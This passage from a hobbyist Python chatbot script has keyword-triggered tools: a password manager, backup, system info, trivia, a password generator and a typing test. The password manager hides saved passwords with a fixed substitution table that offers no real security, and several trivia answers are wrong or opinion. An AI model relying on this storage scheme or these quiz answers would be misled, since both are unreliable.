            'f': 'ay28', 'g': 'u6n-', 'h': 'i4=1', 'i': 'o2j&', 'j': 'p0iU', 'k': '!#+',
            'l': '@*h1', 'm': '#%5j', 'n': '$^nj', 'o': '%&im', 'p': '^!vz', 'q': '&*.',
            'r': '*x@1', 's': '(+9=', 't': ')=[q', 'u': '-_91', 'v': '_=%_', 'w': '=x/',
            'x': '+?am', 'y': '[{7x', 'z': ']}9/', '1': 'Xaty', '2': 'Ybji', '3': 'xZc',
            '4': 'W1fc', '5': 'V:29', '6': 'U.3?', '7': 'T4gu', '8': 'S5bn', '9': 'Rx6',
            '0': 'Qn7f', '!': 'P8x$', '@': 'Ovg9', '#': 'N09!', '$': 'Mz8*', '%': 'aLt',
            '^': 'Kx/1', '&': 'Jw;/', '*': 'Ivk[', '(': 'Hu8m', ')': 'GtmJ', '-': '$!cK',
            '_': 'Er-l', '=': 'Dq98', '+': 'Cp]i', '[': 'Bo|1', ']': 'Anaz', '{': 'p@&t',
            '}': 'jLl*', ':': '8vbx', ';': 'Xti=', '"': 'Yf-o', "'": 'Za2}', ',': '1Ytn',
            '.': 'd#bc', '/': 'Xkx5', '?': 'Yjb#', '|': 'Z0i1', '\\': 'Wh=q', ' ': 'x00x'
        }
        reversed_map = {v: k for k, v in custom_binary_map.items()}

        def encode_text(text):
            """Encodes text using the custom binary map."""
            return ''.join(custom_binary_map.get(char, char) for char in text)

        def decode_text(encoded_text):
            """Decodes text using the reversed binary map."""
            decoded_text = ""
            temp = ""
            for char in encoded_text:
                temp += char
                if temp in reversed_map:
                    decoded_text += reversed_map[temp]
                    temp = ""
            return decoded_text

        def get_file_path():
            """Returns the path to the passwords.txt file."""
            current_dir = os.path.dirname(__file__)
            return os.path.join(current_dir, "passwords.txt")

        def save_password():
            """Saves a new password entry to the file."""
            file_path = get_file_path()
            website = input("Enter Website Name: ").strip()
            username = input("Enter Username: ").strip()
            password = input("Enter Password: ").strip()
            note = input("Enter Additional Note (optional): ").strip()

            if not website or not username or not password:
                print("Website, username, and password are required!")
                return

            password_details = f"\nWebsite: {encode_text(website)}\nUsername: {encode_text(username)}\nPassword: {encode_text(password)}\nNote: {encode_text(note)}\n\n"
            with open(file_path, "a") as f:
                f.write(password_details)
            print("Password saved successfully!")
            print("----------------------------")

        def retrieve_password():
            """Retrieves and displays all password entries."""
            file_path = get_file_path()
            if not os.path.exists(file_path):
                print("No passwords found. Please save some first.")
                return

            with open(file_path, "r") as f:
                entries = f.read().strip().split("\n\n")

            if not entries:
                print("No passwords found. Please save some first.")
                return

            for idx, entry in enumerate(entries, 1):
                print("--------------------")
                print(f"Entry {idx}:\n")
                lines = entry.split("\n")
                for line in lines:
                    if ":" in line:  # Ensure line has a colon to avoid errors
                        key, value = line.split(":", 1)
                        print(f"{key}: {decode_text(value.strip())}")
                    else:
                        print(f"[IGNORE THIS] Invalid line format: {line}")  # For debugging purposes
                    # key, value = line.split(":", 1)
                    # print(f"{key}: {decode_text(value.strip())}")

        def edit_password():
            """Edits an existing password entry with decoded details."""
            file_path = get_file_path()
            if not os.path.exists(file_path):
                print("No passwords found. Please save some first.")
                return

            with open(file_path, "r") as f:
                entries = f.read().strip().split("\n\n")

            if not entries:
                print("No passwords found. Please save some first.")
                return

            # Display entries with decoded details
            print("\nPassword Details:")
            for idx, entry in enumerate(entries, 1):
                print(f"Entry {idx}:\n")
                lines = entry.split("\n")
                for line in lines:
                    if ":" in line:
                        key, value = line.split(":", 1)
                        print(f"{key}: {decode_text(value.strip())}")
                
                print("----------------------")
            try:
                entry_idx = int(input(f"\nEnter the entry number to edit (1-{len(entries)}): ")) - 1
                if entry_idx < 0 or entry_idx >= len(entries):
                    raise ValueError
            except ValueError:
                print("Invalid entry number!")
                return

            selected_entry = entries[entry_idx].split("\n")
            updated_entry = []

            for line in selected_entry:
                if ":" in line:
                    key, value = line.split(":", 1)
                    decoded_value = decode_text(value.strip())
                    if key == "Website":
                        new_value = input(f"Enter new website (leave blank to keep '{decoded_value}'): ").strip()
                        updated_entry.append(f"Website: {encode_text(new_value)}" if new_value else line)
                    elif key == "Username":
                        new_value = input(f"Enter new username (leave blank to keep '{decoded_value}'): ").strip()
                        updated_entry.append(f"Username: {encode_text(new_value)}" if new_value else line)
                    elif key == "Password":
                        new_value = input(f"Enter new password (leave blank to keep '{decoded_value}'): ").strip()
                        updated_entry.append(f"Password: {encode_text(new_value)}" if new_value else line)
                    elif key == "Note":
                        new_value = input(f"Enter new note (leave blank to keep '{decoded_value}'): ").strip()
                        updated_entry.append(f"Note: {encode_text(new_value)}" if new_value else line)
                else:
                    updated_entry.append(line)

            entries[entry_idx] = "\n".join(updated_entry)

            with open(file_path, "w") as f:
                f.write("\n\n".join(entries))

            print("Password updated successfully!")
            print("----------------------------------")

        def main():
            while True:
                print("---- LOCAL PASSWORD MANAGER ----")
                print("1. Save Password\n2. Retrieve Passwords\n3. Edit Passwords Details\n4. Exit")
                choice = input("Choose an option: ").strip()
                print("----------------------------------")
                if choice == "1":
                    save_password()
                elif choice == "2":
                    retrieve_password()
                elif choice == "3":
                    edit_password()
                elif choice == "4":
                    print("Exiting program.")
                    break
                else:
                    print("Invalid choice. Please try again.")

        if __name__ == "__main__":
            main()
        return "Thanks for using Local Password Manager!"

    elif "-mkd" in ui:
        import os 
        choice = input("--- DIRECTORY/FOLDER MAKER ---\n1. Default (current script location)\n2. Custom \n3. Exit\nChoose (1/2/3): ")
        if choice == "1":
            try:
                folder_name = input("Enter Folder name: ")
                os.mkdir(folder_name)
                print("Folder Created Successfully!")
            except ValueError:
                            print("Failed!")
                            
        elif choice == "2":
            try:
                location = input("Enter Custom Location (e.g., path/location/foldername): ")
                os.mkdir(location)
                print("Folder Created Successfully!")
            except FileExistsError:
                print("Failed! The folder already exists.")
            except PermissionError:
                print("Failed! You do not have permission to create a folder here.")
            except FileNotFoundError:
                print("Failed! The specified path does not exist.")
            except Exception as e:
                print(f"Failed! An error occurred: {e}")
        elif choice == "3":
            print("Exit!")
        else:
            print("Invalid Input!")
        return "Thanks for using Directory Maker!"
    elif "-inf" in ui:
        import os
        import platform
        try:
            import psutil
            def get_system_info():
                print("=== System Information ===")
                print(f"System: {platform.system()}")
                print(f"Node Name: {platform.node()}")
                print(f"Release: {platform.release()}")
                print(f"Version: {platform.version()}")
                print(f"Machine: {platform.machine()}")
                print(f"Processor: {platform.processor()}")
            def get_memory_info():
                mem = psutil.virtual_memory()
                print("\n=== Memory Information ===")
                print(f"Total Memory: {mem.total / (1024 ** 3):.2f} GB")
                print(f"Available Memory: {mem.available / (1024 ** 3):.2f} GB")
                print(f"Used Memory: {mem.used / (1024 ** 3):.2f} GB")
                print(f"Memory Usage: {mem.percent}%")

            def get_disk_info():
                print("\n=== Disk Information ===")
                partitions = psutil.disk_partitions()
                for partition in partitions:
                    print(f"Device: {partition.device}")
                    print(f"  Mount Point: {partition.mountpoint}")
                    print(f"  File System: {partition.fstype}")
                    usage = psutil.disk_usage(partition.mountpoint)
                    print(f"  Total Size: {usage.total / (1024 ** 3):.2f} GB")
                    print(f"  Used: {usage.used / (1024 ** 3):.2f} GB")
                    print(f"  Free: {usage.free / (1024 ** 3):.2f} GB")
                    print(f"  Usage: {usage.percent}%\n")
            def get_cpu_info():
                print("\n=== CPU Information ===")
                print(f"Physical Cores: {psutil.cpu_count(logical=False)}")
                print(f"Total Cores: {psutil.cpu_count(logical=True)}")
                print(f"CPU Frequency: {psutil.cpu_freq().current:.2f} MHz")
                print(f"CPU Usage: {psutil.cpu_percent(interval=1)}%")
            if __name__ == "__main__":
                get_system_info()
                get_memory_info()
                get_disk_info()
                get_cpu_info()
        except ImportError:
            return("The 'psutil' library is not installed. Please install it using 'pip install psutil' or 'pip3 install psutil'.")

    elif "are you good in maths?" in ui or "are you good in math?" in ui or "are you good in maths" in ui or "are you good in math" in ui:
        return "I am a chatbot, so I can help you with math problems. Type -calc for math calculations."
    elif "-bkp" in ui:
        import os
        import shutil
        import time
        from datetime import datetime
        print("-- FILES BACKUP --")
        # Define the backup function once
        def backup_files(source, destination):
            if not os.path.exists(destination):
                os.makedirs(destination)
            
            for filename in os.listdir(source):
                src_file = os.path.join(source, filename)
                dest_file = os.path.join(destination, filename)
                
                if os.path.isfile(src_file):
                    shutil.copy2(src_file, dest_file)
                    print(f"Backed up {filename}")

        # Function for daily backups
        def daily_backup(source, destination, backup_time):
            current_time = datetime.now().strftime("%H:%M")
            if current_time == backup_time:
                backup_files(source, destination)
            else:
                print(f"Waiting for {backup_time} to back up...")

        # Main execution block
        if __name__ == "__main__":
            backup_choice = input("1. Manual Backup\n2. Schedule Backup\nChoose(1/2): ")

            if backup_choice == "1":
                source_dir = input("Enter the directory to backup: ")
                if not os.path.isdir(source_dir):
                    print("Source directory does not exist!")
                else:
                    print("*Keep in mind only files can be backed up from a folder*")
                    dest_dir = input("Enter the destination directory: ")
                    backup_files(source_dir, dest_dir)

            elif backup_choice == "2":
                try:
                    import schedule
                    source_dir = input("Enter the directory to backup: ")
                    if not os.path.isdir(source_dir):
                        print("Source directory does not exist!")
                    else:
                        print("*Keep in mind only files can be backed up from a folder*")
                        print("*You need to run this script in the background to work.*")
                        dest_dir = input("Enter the destination directory: ")

                        # Define the backup time (24-hour format, e.g., 14:30 for 2:30 PM)
                        backup_time = input("Enter the time for the backup (HH:MM, 24-hour format): ")

                        # Schedule the task to run every minute and check if it's time for backup
                        schedule.every().minute.do(daily_backup, source=source_dir, destination=dest_dir, backup_time=backup_time)

                        print(f"Backup scheduled at {backup_time} daily.")

                        while True:
                            schedule.run_pending()
                            time.sleep(60)  # Sleep for a minute before checking again

                except ImportError:
                    return("You need to install 'schedule' library to use this! Use 'pip install schedule' or 'pip3 install schedule'")
            else:
                print("Invalid Choice!")
                return "Done!"

    elif "are you stupid?" in ui or "are you stupid" in ui:
        return "Sorry! i will try to be nice"
    elif "you are smart" in ui or "hey you are smart" in ui or "you are intelligent" in ui or "you are clever" in ui or "you are being smarter" in ui:
        return "Thank you! I'm here to help you."
    elif "elon musk" in ui:
            return "ohh he is so clever"
    elif "your version" in ui or "what is your version" in ui or "this chatbot version" in ui or "your version?" in ui or "-vr" in ui:
        return "Version 1.0.0"    
    elif "hehe boi" in ui or "hehe boy" in ui:
        return "haha, that meme is so funny.."
    elif "you are good" in ui or "you are nice" in ui:
        return "Thank you! I'm here to help you."
    elif "you are ugly" in ui or "you looks ugly" in ui:
        return "But i am a bot, I don't have any physical appearance :)"
    # elif "what's my name" in ui or "tell me what is my name" in ui or "what is my name" in ui:
    #     return "I am a bot, I don't know your name."
    elif "word of the day" in ui or "tell me a unique word" in ui or "tell me a random word" in ui or "-wotd" in ui or "unique word" in ui: #word of the day
        import random
        words = [
                "Resilient (adj.): Able to recover quickly from difficulties.",
                "Euphoria (noun): Intense happiness or excitement.",
                "Ephemeral (adj.): Lasting a very short time.",
                "Tenacity (noun): Persistent determination.",
                "Serendipity (noun): The occurrence of events by chance in a happy way.",
                "Candid (adj.): Truthful and straightforward.",
                "Meticulous (adj.): Showing great attention to detail.",
                "Nostalgia (noun): Sentimental longing for the past.",
                "Ineffable (adj.): Too great to be expressed in words.",
                "Vivacious (adj.): Full of life and energy.",
                "Fortitude (noun): Courage in pain or adversity.",
                "Solace (noun): Comfort in times of distress.",
                "Altruism (noun): The selfless concern for others.",
                "Ambivalent (adj.): Having mixed feelings about something.",
                "Catalyst (noun): Something that causes change or action.",
                "Ponder (verb): To think about something carefully.",
                "Cryptic (adj.): Mysterious or obscure.",
                "Rejuvenate (verb): To make someone or something feel young again.",
                "Eloquent (adj.): Fluent and persuasive in speaking or writing.",
                "Intrinsic (adj.): Belonging naturally; essential.",
                "Camaraderie (noun): Mutual trust and friendship among people.",
                "Luminous (adj.): Full of light; bright or shining.",
                "Idyllic (adj.): Extremely happy, peaceful, or picturesque.",
                "Ambience (noun): The character or atmosphere of a place.",
                "Tangible (adj.): Perceptible by touch; capable of being touched.",
                "Ubiquitous (adj.): Present, appearing, or found everywhere.",
                "Metamorphosis (noun): A transformation or change in form.",
                "Perplexed (adj.): Completely baffled; very puzzled.",
                "Paradox (noun): A statement that contradicts itself but may be true.",
                "Transcend (verb): To go beyond the range or limits of.",
                "Serene (adj.): Calm, peaceful, and untroubled.",
                "Pristine (adj.): In its original condition; unspoiled.",
                "Mellifluous (adj.): Sweetly flowing or sounding.",
                "Exquisite (adj.): Extremely beautiful and delicate.",
                "Conundrum (noun): A confusing and difficult problem or question.",
                "Sagacious (adj.): Having or showing good judgment; wise.",
                "Tranquil (adj.): Free from disturbance; calm.",
                "Oblivion (noun): The state of being unaware or unconscious of what is happening.",
                "Vicarious (adj.): Experienced in the imagination through the feelings or actions of another person.",
                "Resplendent (adj.): Attractive and impressive through being richly colorful or sumptuous.",
                "Exhilarating (adj.): Making one feel very happy, animated, or elated.",
                "Ebullient (adj.): Cheerful and full of energy.",
                "Abdicate (verb): To renounce or relinquish a throne, right, power, claim, responsibility, or the like.",
                "Capricious (adj.): Subject to, led by, or indicative of a sudden, odd notion or unpredictable change; erratic.",
                "Embellish (verb): To beautify by or as if by ornamentation; to enhance (a statement or narrative) with fictitious additions.",
                "Evocative (adj.): Tending to evoke or call forth memories, feelings, or images.",
                "Extrapolate (verb): To infer or estimate by extending or projecting known information.",
                "Frivolous (adj.): Characterized by lack of seriousness or sense; self-indulgently carefree; unconcerned about or lacking any serious purpose.",
                "Juxtaposition (noun): An act or instance of placing close together or side by side, especially for comparison or contrast.",
                "Loquacious (adj.): Very talkative; characterized by excessive talk.",
                "Mellifluous (adj.): Sweetly or smoothly flowing; sweet-sounding.",
                "Mitigate (verb): To make less severe, serious, or painful.",
                "Perspicacious (adj.): Having a ready insight into and understanding of things.",
                "Superfluous (adj.): Unnecessary, especially through being more than enough.",
                "Trepidation (noun): A feeling of fear or agitation about something that may happen.",
                "Vivacious (adj.): Attractively lively and animated.",
                "Vitriol (noun): Cruel and bitter criticism.",
                "Ubiquitous (adj.): Present, appearing, or found everywhere.",
                "Pernicious (adj.): Having a harmful effect, especially in a gradual or subtle way.",
                "Sycophant (noun): A person who acts obsequiously toward someone important in order to gain advantage.",
                "Ephemeral (adj.): Lasting for a very short time.",
                "Sycophant (noun): A person who acts obsequiously toward someone important in order to gain advantage.",
                "Pernicious (adj.): Having a harmful effect, especially in a gradual or subtle way.",
                "Quixotic (adj.): Extremely idealistic; unrealistic and impractical.",
                "Ebullient (adj.): Overflowing with enthusiasm or excitement; high-spirited.",
                "Cacophony (noun): A harsh, discordant mixture of sounds.",
                "Serendipity (noun): The occurrence of events by chance in a happy or beneficial way.",
                "Mellifluous (adj.): Sweet or musical; pleasant to hear.",
                "Obfuscation (noun): intended meaning of communication by making the message difficult to understand, usually with confusing and ambiguous language."
                "Disparate (adj.): Essentially different in kind; not allowing comparison.",
                "Insidious (adj.): Proceeding in a subtle way but with harmful effects.",
                "Ineffable (adj.): Too great or extreme to be expressed or described in words.",
                "Quagmire (noun): A soft boggy area of land; a difficult or precarious situation.",
                "Recalcitrant (adj.): Having an obstinately uncooperative attitude.",
                "Inefficacious (adj.): Not producing the desired effect.",
                "Inscrutable (adj.): Impossible to understand or interpret.",
                "Obfuscate (verb): To deliberately make something unclear or difficult to understand.",
                "Disparate (adj.): Essentially different in kind; not allowing comparison.",
                "Ebullient (adj.): Overflowing with enthusiasm or excitement; high-spirited.",
                "Cacophony (noun): A harsh, discordant mixture of sounds.",
                "Serendipity (noun): The occurrence of events by chance in a happy or beneficial way.",
                "Mellifluous (adj.): Sweet or musical; pleasant to hear.",
                "Disparate (adj.): Essentially different in kind; not allowing comparison.",
                "Insidious (adj.): Proceeding in a subtle way but with harmful effects.",
                "Ineffable (adj.): Too great or extreme to be expressed or described in words.",
                "Aplomb (noun): Self-confidence or assurance, especially when in a demanding situation.",
                "Benevolent (adj.): Well-meaning and kindly.",
                "Cacophony (noun): A harsh, discordant mixture of sounds.",
                "Defenestration (noun): The act of throwing someone out of a window.",
                "Ebullient (adj.): Overflowing with enthusiasm or excitement; high-spirited.",
                "Flabbergasted (adj.): Extremely surprised or shocked.",
                "Garrulous (adj.): Excessively talkative, especially on trivial matters.",
                "Hapless (adj.): Unfortunate or unlucky.",
                "Ineffable (adj.): Too great or extreme to be expressed or described in words.",
                "Juxtapose (verb): To place or deal with close together for contrasting effect.",
                "Kaleidoscope (noun): A constantly changing pattern or sequence of elements.",
                "Lethargic (adj.): Affected by lethargy; sluggish and apathetic.",
                "Munificent (adj.): More generous than is usual or necessary.",
                "Nefarious (adj.): Wicked or criminal.",
                "Obfuscate (verb): To deliberately make something unclear or difficult to understand.",
                "Pernicious (adj.): Having a harmful effect, especially in a gradual or subtle way.",
                "Quixotic (adj.): Extremely idealistic; unrealistic and impractical.",
                "Recalcitrant (adj.): Having an obstinately uncooperative attitude.",
                "Sycophant (noun): A person who acts obsequiously toward someone important in order to gain advantage.",
                "Ubiquitous (adj.): Present, appearing, or found everywhere.",
                ]
        selectedWord = random.choice(words)
        return(selectedWord)

    elif "-trv" in ui:
                import random
                print("----- 10 QUESTIONS TRIVIA -----")
                questions = [
                    {"question": "What is the capital of Australia?", "options": ["Sydney", "Canberra", "Melbourne", "Brisbane"], "answer": "Canberra"},
                    {"question": "Which programming language is known as the language of the web?", "options": ["Python", "Java", "JavaScript", "C#"], "answer": "JavaScript"},
                    {"question": "What is 87 + 54?", "options": ["156", "141", "231", "184"], "answer": "141"},
                    {"question": "Which planet is known as the Red Planet?", "options": ["Earth", "Mars", "Jupiter", "Saturn"], "answer": "Mars"},
                    {"question": "Who wrote 'Romeo and Juliet'?", "options": ["Charles Dickens", "William Shakespeare", "Leo Tolstoy", "Mark Twain"], "answer": "William Shakespeare"},
                    {"question": "What is the largest mammal in the world?", "options": ["Elephant", "Blue Whale", "Giraffe", "Great White Shark"], "answer": "Blue Whale"},
                    {"question": "What is the boiling point of water?", "options": ["100°C", "90°C", "80°C", "120°C"], "answer": "100°C"},
                    {"question": "Which gas do plants absorb from the atmosphere?", "options": ["Oxygen", "Carbon Dioxide", "Nitrogen", "Hydrogen"], "answer": "Carbon Dioxide"},
                    {"question": "What is the square root of 64?", "options": ["6", "7", "8", "9"], "answer": "8"},
                    {"question": "Which continent is known as the Dark Continent?", "options": ["Asia", "Africa", "Europe", "Australia"], "answer": "Africa"},
                    {"question": "What is the capital of France?", "options": ["Berlin", "Madrid", "Paris", "Lisbon"], "answer": "Paris"},
                    {"question": "What is the largest planet in our solar system?", "options": ["Earth", "Jupiter", "Saturn", "Mars"], "answer": "Jupiter"},
                    {"question": "Which instrument measures atmospheric pressure?", "options": ["Barometer", "Thermometer", "Anemometer", "Hydrometer"], "answer": "Barometer"},
                    {"question": "What is the hardest mineral on the Mohs scale?", "options": ["Diamond", "Quartz", "Topaz", "Corundum"], "answer": "Diamond"},
                    {"question": "Which country is known as the Land of the Rising Sun?", "options": ["China", "Japan", "Thailand", "Vietnam"], "answer": "Japan"},
                    {"question": "What is the main ingredient in hummus?", "options": ["Chickpeas", "Lentils", "Beans", "Peas"], "answer": "Chickpeas"},
                    {"question": "What is the currency used in the United Kingdom?", "options": ["Dollar", "Euro", "Pound Sterling", "Yen"], "answer": "Pound Sterling"},
                    {"question": "What is the square root of 49?", "options": ["6", "7", "8", "9"], "answer": "7"},
                    {"question": "Which is the smallest country in the world?", "options": ["Monaco", "Vatican City", "San Marino", "Liechtenstein"], "answer": "Vatican City"},
                    {"question": "Who painted the Mona Lisa?", "options": ["Vincent Van Gogh", "Pablo Picasso", "Leonardo da Vinci", "Claude Monet"], "answer": "Leonardo da Vinci"},
                    {"question": "Which animal is known for its stripes?", "options": ["Lion", "Tiger", "Elephant", "Giraffe"], "answer": "Tiger"},
                    {"question": "Most easiest code language?","options": ["C#", "Python", "Kotlin", "Java"], "answer":"Python"},
                    {"question": "Which metal is heavier, gold or silver?", "options": ["Gold", "Silver", "Both are equal", "Neither"], "answer": "Gold"},
                    {"question": "Capital of Japan?","options": ["Tokyo", "Kasukabe", "Osaka", "Kyoto"],"answer":"Tokyo"},
                    {"question": "Jaguar Country of origin?","options": ["USA", "India", "UK", "China"],"answer": "India"},
                    {"question": "Most difficult language In the world","options": ["Hindi", "Chinese", "Russian", "French"],"answer": "Chinese"},
                    {"question": "Most subscribed individual YouTuber?","options": ["Pewdiepie", "Mrbeast", "KSI", "Christiano Ronaldo"],"answer": "Mrbeast"},
                    {"question": "Which mammal is known to have the most extended migration?","options": ["Elephant", "Humpback Whale", "Monarch Butterfly", "Arctic Tern?"],"answer": "Humpback Whale"},
                    {"question": "What is the primary color of the olympic flag's Background?","options": ["White", "Black", "Gray", "Blue"],"answer": "White"},
                    {"question": "Which continent has the highest number of countries?","options": ["Asia", "Europe", "Africa", "South America"],"answer": "Africa"},
                    {"question": "Which country has everything in nature?","options": ["China", "India", "USA", "Russia"],"answer": "India"},
                    {"question": "Best quality of life country?","options": ["Switzerland", "USA", "China", "UK"],"answer": "Switzerland"},
                    {"question": "Best selling video game of all time?","options": ["Minecraft", "GTAV", "Black Myth Wukong", "Resident Evil 4 Remake"],"answer": "Minecraft"},
                    {"question": "Who is the Great Pop Star of all time?","options": ["Taylor Swift", "Michael Jackson", "Billie Eilish", "Justin Bieber"],"answer": "Michael Jackson"},
                    {"question": "What do bees produce?", "options": ["Honey", "Silk", "Wax", "Fruit"], "answer": "Honey"},
                    {"question": "What is the longest river in Africa?", "options": ["Congo", "Nile", "Niger", "Zambezi"], "answer": "Nile"},
                    {"question": "What is the capital of Japan?", "options": ["Seoul", "Tokyo", "Beijing", "Bangkok"], "answer": "Tokyo"},
                    {"question": "Who discovered penicillin?", "options": ["Louis Pasteur", "Alexander Fleming", "Marie Curie", "Albert Einstein"], "answer": "Alexander Fleming"},
                    {"question": "Which planet is known for its rings?", "options": ["Earth", "Saturn", "Neptune", "Uranus"], "answer": "Saturn"},
                    {"question": "What is the currency used in Japan?", "options": ["Yen", "Won", "Dollar", "Euro"], "answer": "Yen"},
                    {"question": "Who wrote '1984'?", "options": ["George Orwell", "Aldous Huxley", "F. Scott Fitzgerald", "Mark Twain"], "answer": "George Orwell"},
                    {"question": "What is the hardest natural substance on Earth?", "options": ["Diamond", "Gold", "Iron", "Platinum"], "answer": "Diamond"},
                    {"question": "What is the capital of Italy?", "options": ["Rome", "Venice", "Florence", "Milan"], "answer": "Rome"},
                    {"question": "Which gas do we breathe in?", "options": ["Oxygen", "Nitrogen", "Carbon Dioxide", "Helium"], "answer": "Oxygen"},
                    {"question": "What is the tallest mountain in the world?", "options": ["K2", "Kangchenjunga", "Lhotse", "Mount Everest"], "answer": "Mount Everest"},
                    {"question": "What is the smallest country in Asia?", "options": ["Maldives", "Singapore", "Brunei", "Bhutan"], "answer": "Maldives"},
                    {"question": "Which country gifted the Statue of Liberty to the USA?", "options": ["Germany", "France", "Spain", "Italy"], "answer": "France"},
                    {"question": "What color is the gemstone ruby?", "options": ["Red", "Blue", "Green", "Yellow"], "answer": "Red"},
                    {"question": "What is the capital city of Egypt?", "options": ["Cairo", "Luxor", "Alexandria", "Aswan"], "answer": "Cairo"},
                    {"question": "What is the closest planet to the sun?", "options": ["Mercury", "Venus", "Earth", "Mars"], "answer": "Mercury"},
                    {"question": "Which planet are not in solar system group?","options": ["Moon", "Uranus", "Pluto", "Sun"],"answer": "Pluto"},
                    {"question": "In which Japanese cities USA dropped the nuclear bombs?","options": ["Hiroshima and nagasaki", "nagasaki and kasukabe", "Hiroshima and kyoto", "Kasukabe and kyoto"],"answer": "Hiroshima and nagasaki"},  
                    {"question": "What is the national flower of india?","options": ["Lotus", "Rose", "Sunflower", "Jasmine"],"answer": "Lotus"},
                    {"question": "Who developed the theory of relativity?","options": ["Isaac Newton", "Galileo galilei", "Albert Einstein", "Nicola Tesla"],"answer": "Albert Einstein"},
                    {"question": "What is the smallest unit of life?","options": ["Atom", "Cell", "Organ", "Molecule"],"answer": "Cell"},
                    {"question": "Which country is famous for its maple syrup?","options": ["USA", "Canada", "France", "Russia"],"answer": "Canada"},
                    {"question": "What is the largest desert in the world?","options": ["Sahara", "Antarctica", "Gobi", "Arabian"],"answer": "Antarctica"},
                    {"question": "Which language has the most native language speakers?","options": ["English", "Hindi", "Chinese", "Spanish"],"answer": "Chinese"},
                    {"question": "In which year did World War 2 end?","options": ["1941", "1945", "1947", "1949"],"answer": "1945"},
                    {"question": "What is the main ingredient in guacamole?","options": ["Tomato", "Avocado", "Lemon", "Onion"],"answer": "Avocado"},
                    {"question": "Which river flows through paris?","options": ["Thames", "Rhine", "Seine", "Danube"],"answer": "Seine"},
                    {"question": "Who invented the World Wide Web?","options": ["Tim berners lee", "Steve jobs", "Bill gates", "Mark zuckerburg"],"answer": "Tim berners lee"},
                    {"question": "Which bird is often associated with delivering babies in folklore?","options": ["Sparrow", "Pegion", "Stork", "Eagle"],"answer": "Stork"},
                    {"question": "What does the richter scale measure?","options": ["Wind speed", "Earthquake Magnitude", "Temperature", "Atmospheric Pressure"],"answer": "Earthquake Magnitude"},
                    {"question": "Total bones in human body?","options": ["206", "212", "190", "156"],"answer": "206"},
                    {"question": "What is the national flower of Japan?", "options": ["Lotus", "Tulip", "Cherry Blossom", "Rose"], "answer": "Cherry Blossom"}
                ]
                # Shuffle questions and select only 10
                random.shuffle(questions)
                # Initialize the score
                score = 0

                # Ask 10 questions
                for i in range(10):
                    question = questions[i]
                    print(f"Q{i + 1}: {question['question']}")
                    for j, option in enumerate(question['options'], start=1):
                        print(f"  {j}. {option}")
                    
                    # Get user's answer
                    user_answer = input("Your answer (1-4): ")
                    correct_option = question['options'].index(question['answer']) + 1
                    
                    if user_answer.isdigit() and int(user_answer) == correct_option:
                        print("Correct!")
                        score += 1
                    else:
                        print(f"Wrong! The correct answer is {question['answer']}.")
                    print()  # Blank line for readability

                # Display total score at the end
                print(f"Your total score: {score}/10")
                print("-----------------------\n")
                return "Hope you liked the Trivia Quiz!"

    elif "-pg" in ui or "generate password" in ui or "create a strong password" in ui or "generate a strong password" in ui or "create a strong password for me" in ui: #Strong password generater
                import secrets
                import string

                def generate_secure_password(length):
                    characters = string.ascii_letters + string.digits + string.punctuation
                    password = ''.join(secrets.choice(characters) for _ in range(length))
                    return password

                # Ask the user for password length
                try:
                    print("------------------------------------")
                    length = int(input("Enter the desired password length: "))
                    if length <= 0:
                        print("Password length must be a positive number!")
                        return "Enter -pg again!"
                    else:
                        password = generate_secure_password(length)
                        print(f"Secure Password: {password}")
                        print("------------------------------------")
                        return "Your Password is Ready!"
                except ValueError:
                    return ("Please enter a valid number!")
    elif "say iconic line" in ui or "say an iconic line" in ui or "tell me an iconic line" in ui or "say any iconic line" in ui or "say an any iconic line" in ui or "say some iconic lines" in ui or "say some iconic line" in ui :
        import random
        iconic_lines = ("Hehe Boi - Ainsley Harriot","where's everyone going? bingo? - Resident Evil 4", "wouldn't make me use this? would you? - Resident Evil 4", "abey jaldi bol kal subah panwel nikalna hai! - Golmaal 3", "mujhe lagta hai ki mujhe yahi lena chahiye.. - Deepak kalal", "May the Force be with you. - Star Wars", "I'll be back. - The Terminator", "With great power comes great responsibility. - Spider-Man")
        return random.choice(iconic_lines)
    elif "can you roast me?" in ui or "can you roast me" in ui or "please roast me" in ui or "roast me" in ui:
        import random
        roasted_replies = ["Your mirror called. It wants an apology.",
                           "Relax, even your browser history isn't worth my data storage.",
                           "Your brain must be on airplane mode.",
                           "I'd agree with you, but then we'd both be wrong.",
                           "You're like my favorite TV show... on mute.",
                           "Relax, Shakespeare, it's not that deep."
        ]
        return random.choice(roasted_replies)
    elif "-tst" in ui:
            import random
            import time

            # Sentences for different difficulty levels
            easy_sentences = [
                "The quick brown fox.",
                "Python is fun.",
                "Python is great.",
                "Hello World.",
                "I love coding.",
                "It's amazing.",
                "It's Typing Speed Test."
            ]

            medium_sentences = [
                "Learning Python is very interesting.",
                "I enjoy creating programs with Tkinter.",
                "This typing speed test will help you improve.",
                "The faster you type, the better you get.",
                "Practice makes perfect in programming.",
                "Mistakes convert into better performance."
            ]

            hard_sentences = [
                "In computer science, recursion is a method where the solution to a problem depends on solutions to smaller instances of the same problem.",
                "The faster you type, the better your typing speed test results will be, but don't forget to maintain accuracy as well.",
                "By practicing regularly, you can improve your typing speed significantly and even achieve remarkable results in a short time.",
                "Artificial intelligence is a field of computer science that aims to create machines capable of intelligent behavior, mimicking human thought and actions.",
                "Using machine learning algorithms, computers can learn from data and make predictions or decisions without being explicitly programmed to perform specific tasks."
            ]

            def select_difficulty():
                print("---- TYPING SPEED TEST ----")
                print("\nSelect Difficulty Level:")
                print("1. Easy")
                print("2. Medium")
                print("3. Hard")
                print("4. Exit")
                
                choice = input("Enter your choice (1/2/3/4): ")
                
                if choice == "1":
                    return "easy"
                elif choice == "2":
                    return "medium"
                elif choice == "3":
                    return "hard"
                elif choice == "4":
                    return "exit"
                else:
                    print("Invalid choice. Please select a valid option.")
                    return select_difficulty()

            def start_test(difficulty):
                if difficulty == "easy":
                    sentence = random.choice(easy_sentences)
                elif difficulty == "medium":
                    sentence = random.choice(medium_sentences)
                elif difficulty == "hard":
                    sentence = random.choice(hard_sentences)
                
                print("\n----------------------")
                print("Your sentence to type:")
                print(sentence)
                print("----------------------")
                print("\nStart typing...")

                start_time = time.time()
                typed_text = input("Your input: ")

                while typed_text != sentence:
                    print("Incorrect! Try again.")
                    typed_text = input("Your input: ")

                time_taken = round(time.time() - start_time, 2)
                words_typed = len(typed_text.split())

                wpm = round((words_typed / time_taken) * 60)
                print("\n----------------------------------")
                print(f"Time Taken: {time_taken} seconds")
                print(f"Words per Minute (WPM): {wpm}")
                print("----------------------------------")

            def typing_speed_test():
                difficulty = select_difficulty()
                if difficulty == "exit":
